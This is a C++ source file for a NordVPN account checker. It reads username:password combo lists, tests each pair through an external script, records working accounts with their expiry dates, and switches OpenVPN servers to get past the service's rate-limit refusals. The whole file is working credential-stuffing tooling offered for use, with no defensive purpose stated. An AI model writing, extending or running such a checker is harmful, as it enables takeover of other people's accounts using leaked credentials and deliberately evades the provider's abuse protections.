#include <iostream>
#include <string>
#include<cstring>
#include <fstream>
#include <unistd.h>
#include <sys/wait.h>

//#define __DEBUG
#define TEMPFILE ".tempfile.txt"
#define CHECK_SCRIPT "./check_script.sh"
#define SWITCH_SCRIPT "./switch_script.sh"
#define BUFLEN 50
#define LIMIT 500
#define STATUS_SUCCESS 0
#define STATUS_FAILURE 1
#define STATUS_API_REFUSED 2
#define TOTAL_SERVERS 20
using namespace std;

void parseCombo(const string& combo, string& username, string& password);
int checkStatus(void);
string getExpiry(void);
bool changeAccount(int nextServerNum, int currServerNum);

int main(int argc, char* argv[])
{
    if(argc != 5 && argc != 7)
    {

        cerr << "[ERROR]: nord-checker: Invalid Number of Arguments\nUsage: " << "./nordchecker -f {input_file_path} -o {output_file_path}\n";
        return -1;
    }

    if(strcmp(argv[1], "-i") != 0 && strcmp(argv[1], "--input") != 0)
    {
        cerr << "[ERROR]: nord-checker: Invalid Flag: " << argv[1] << '\n';
        return -1;
    }

    if(strcmp(argv[3], "-o") != 0 && strcmp(argv[3], "--output") != 0)
    {
        cerr << "[ERROR]: nord-checker: Invalid Flag: " << argv[3] << '\n';
        return -1;
    }

    ifstream ifile{argv[2]};
    if(ifile.fail() || ifile.bad())
    {
        cerr << "[ERROR]: nord-checker: Failed to Open Input file\n";
        return -1;
    }

    ofstream ofile{argv[4], std::fstream::out | std::fstream::app};
    if(ofile.fail() || ofile.bad())
    {
        cerr << "[ERROR]: nord-checker: Failed to Open Output file\n";
    }

    string combo, username, password;

    int count{1}, nextServerNum{2}, currServerNum{1};

    if(argc == 7)
    {
	    int i = std::stoi(argv[6]);
	    if(i >= 1)
	    {
		    currServerNum = i;
		    nextServerNum = i+1;
	    }
    }
		    
    bool checkback{false};

    while(count <= LIMIT && !ifile.eof())
    {
	if(!checkback)
	{
		getline(ifile, combo);
        	parseCombo(combo, username, password);
	}
	else
		checkback = false;

        pid_t rpid = fork();
        if(rpid == -1)
        {
            perror("[ERROR]: nordvpn-checker: fork");
            return -1;
        }

        if(rpid == 0)
        {
            int ret = execlp(CHECK_SCRIPT, CHECK_SCRIPT, username.c_str(), password.c_str(), nullptr);
            if(ret == -1)
            {
                perror("[ERROR]: nordvpn-checker: execlp");
                return -1;
            }
        }
    
	#ifdef __DEBUG
	cerr << "[DEBUG]: CPID Before Wait: " << rpid << '\n';
	#endif

	cout << count << ": Checking:\t" << combo << flush;
        pid_t cpid = wait(nullptr);

	#ifdef __DEBUG
	cerr << "[DEBUG]: CPID By Wait: " << cpid << '\n';
	#endif
	
        int status = checkStatus();
        if(status == STATUS_SUCCESS)
        {
            string expiry = getExpiry();
            ofile << combo << "\t|\tExpiry: " << expiry << endl;
            cout << "\t[SUCCESS]:" << "\tExpiry: " << expiry << '\n';
        }
        else if(status == STATUS_API_REFUSED)
        {
            cout << "\t[FAILURE]:\t[API REFUSED TO SERVE REQUEST]\n";
	    checkback = true;

	    if(nextServerNum > TOTAL_SERVERS)
		    nextServerNum = 1;

	    if(currServerNum > TOTAL_SERVERS)
		    currServerNum = 1;

	    bool ret = changeAccount(nextServerNum, currServerNum);
	    	if(!ret)
		{
			cout << "[ERROR]: Not Able to Switch NordAccount After API Ban\n";
			return -1;
		}
		else
		{
			cout << "Switched Your Openvpn Server to server Number: " << nextServerNum << '\n';
			nextServerNum++;
			currServerNum++;
			sleep(10);
		}
        }
	else
	{
		cout << "\t[FAILURE]:\tWrong Credentials OR MFA\n";
	}

        count++;
    }


    changeAccount(0, currServerNum);
    ofile.close();
    ifile.close();
    
    return 0;
}

void parseCombo(const string& combo, string& username, string& password)
{
    size_t delimPos = combo.find(":");
    username = combo.substr(0, delimPos);

    #ifdef __DEBUG
        cerr << "[DEBUG]: Username: " << username << '\n';
    #endif

    password = combo.substr(delimPos+1, string::npos);

    #ifdef __DEBUG
        cerr << "[DEBUG]: Password: " << password << '\n';
	cerr << "[DEBUG]: Length of Password: " << strlen(password.c_str()) << '\n';
	cerr << "[DEBUG]: Ascii Value of Last Character in Password: " << (int)password[8] << '\n';
    #endif

    return ;
}

int checkStatus(void)
{
    string line;
    ifstream tempfile{TEMPFILE};
    if(!tempfile.good())
    {
	    cerr << "[ERROR]: checkStatus: Failed to Open tempfile\n";
	    exit(-1);
    }
    while(!tempfile.eof() && tempfile.good())
    {
        getline(tempfile, line);
	#ifdef __DEBUG
		cerr << "[DEBUG]: Content of " << TEMPFILE << " : " << line << '\n';
	#endif

        if(line.find("Welcome") != string::npos)
            return STATUS_SUCCESS;
	else if(line.find("It's not") != string::npos)
		return STATUS_API_REFUSED;


    }

    return STATUS_FAILURE;
}

string getExpiry(void)
{
    string line{"Unknown"};
    ifstream tempfile{TEMPFILE};
    while(!tempfile.eof() && tempfile.good())
    {
        getline(tempfile, line);
        size_t reqIndex = line.find("VPN Service:");
        if(reqIndex != string::npos)
            return line.substr(reqIndex + 12, string::npos);
    }
    
    return line;
}

bool changeAccount(int nextServerNum, int currServerNum)
{
	int status;
	string nextServerNumString;
	if(nextServerNum != 0)
		nextServerNumString = std::to_string(nextServerNum);
	string currServerNumString;
	if(currServerNum != 0)
		currServerNumString = std::to_string(currServerNum);


	pid_t rpid = fork();
	if(rpid == -1)
	{
		perror("changeAccount: fork");
		return false;
	}
	else if(rpid == 0)
	{
		int ret = execlp(SWITCH_SCRIPT, SWITCH_SCRIPT, nextServerNumString.c_str(), currServerNumString.c_str(), nullptr);
		if(ret == -1)
		{
			perror("changeAccount: execlp");
			exit(-1);
		}
	}

	pid_t cpid = wait(&status);

	if(WIFEXITED(status) && (WEXITSTATUS(status) == 0))
		return true;

	return false;
}
